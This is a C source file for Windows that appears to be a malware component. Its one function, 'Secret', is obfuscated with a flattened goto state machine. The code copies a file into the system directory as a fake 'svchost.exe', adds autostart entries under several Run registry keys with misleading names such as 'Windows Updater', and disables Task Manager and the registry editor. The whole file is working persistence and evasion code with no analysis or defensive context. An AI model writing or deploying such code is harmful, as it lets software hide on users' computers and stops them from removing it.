#include "data_globals.h"
#pragma optimize("", off)
void Secret(LPCSTR sourceFilePath)
{
    volatile int dummy_state = 1;
    int dummy_return = 0;
    char systemPath[MAX_PATH];
    HKEY hKey;
    BYTE enable[4] = {1, 0, 0, 0};
    size_t len;
    DWORD regSize;

dummy_dispatcher:
    if (dummy_state == 1) goto dummy_state_1;
    if (dummy_state == 2) goto dummy_state_2;
    if (dummy_state == 3) goto dummy_state_3;
    if (dummy_state == 4) goto dummy_state_4;
    if (dummy_state == 5) goto dummy_state_5;
    if (dummy_state == 6) goto dummy_state_6;
    if (dummy_state == 7) goto dummy_state_7;
    if (dummy_state == 8) goto dummy_state_8;
    if (dummy_state == 9) goto dummy_state_9;
    if (dummy_state == 10) goto dummy_state_10;
    if (dummy_state == 11) goto dummy_state_11;
    if (dummy_state == 12) goto dummy_state_12;
    if (dummy_state == 0) goto dummy_end;

dummy_state_1:
    GetSystemDirectoryA(systemPath, MAX_PATH);
    dummy_state = 2;
    goto dummy_dispatcher;

dummy_state_2:
    len = strlen(systemPath);
    dummy_state = 3;
    goto dummy_dispatcher;

dummy_state_3:
    strcpy(systemPath + len, "\\Generic");
    CreateDirectoryA(systemPath, NULL);
    dummy_state = 4;
    goto dummy_dispatcher;

dummy_state_4:
    len = strlen(systemPath);
    dummy_state = 5;
    goto dummy_dispatcher;

dummy_state_5:
    strcpy(systemPath + len, "\\svchost.exe");
    CopyFileA(sourceFilePath, systemPath, FALSE);
    dummy_state = 6;
    goto dummy_dispatcher;

dummy_state_6:
    RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                  "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                  0, KEY_SET_VALUE, &hKey);
    regSize = (DWORD)(strlen(systemPath) + 1);
    RegSetValueExA(hKey, "Generic Host Process for Win32 Services", 0,
                   REG_SZ, (const BYTE*)systemPath, regSize);
    RegCloseKey(hKey);
    dummy_state = 7;
    goto dummy_dispatcher;

dummy_state_7:
    RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                  "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
                  0, KEY_SET_VALUE, &hKey);
    regSize = (DWORD)(strlen(systemPath) + 1);
    RegSetValueExA(hKey, "Windows Updater", 0,
                   REG_SZ, (const BYTE*)systemPath, regSize);
    RegCloseKey(hKey);
    dummy_state = 8;
    goto dummy_dispatcher;

dummy_state_8:
    RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                  "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx",
                  0, KEY_SET_VALUE, &hKey);
    regSize = (DWORD)(strlen(systemPath) + 1);
    RegSetValueExA(hKey, "Windows Server", 0,
                   REG_SZ, (const BYTE*)systemPath, regSize);
    RegCloseKey(hKey);
    dummy_state = 9;
    goto dummy_dispatcher;

dummy_state_9:
    RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                  "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunServices",
                  0, KEY_SET_VALUE, &hKey);
    regSize = (DWORD)(strlen(systemPath) + 1);
    RegSetValueExA(hKey, "Generic", 0,
                   REG_SZ, (const BYTE*)systemPath, regSize);
    RegCloseKey(hKey);
    dummy_state = 10;
    goto dummy_dispatcher;

dummy_state_10:
    RegOpenKeyExA(HKEY_CURRENT_USER,
                  "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
                  0, KEY_SET_VALUE, &hKey);
    RegSetValueExA(hKey, "DisableTaskMgr", 0,
                   REG_DWORD, enable, sizeof(enable));
    RegCloseKey(hKey);
    dummy_state = 11;
    goto dummy_dispatcher;

dummy_state_11:
    RegOpenKeyExA(HKEY_CURRENT_USER,
                  "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
                  0, KEY_SET_VALUE, &hKey);
    RegSetValueExA(hKey, "DisableRegistrytools", 0,
                   REG_DWORD, enable, sizeof(enable));
    RegCloseKey(hKey);
    dummy_state = 12;
    goto dummy_dispatcher;

dummy_state_12:
    dummy_state = 0;
    goto dummy_dispatcher;

dummy_end:
    return;
}
#pragma optimize("", on)
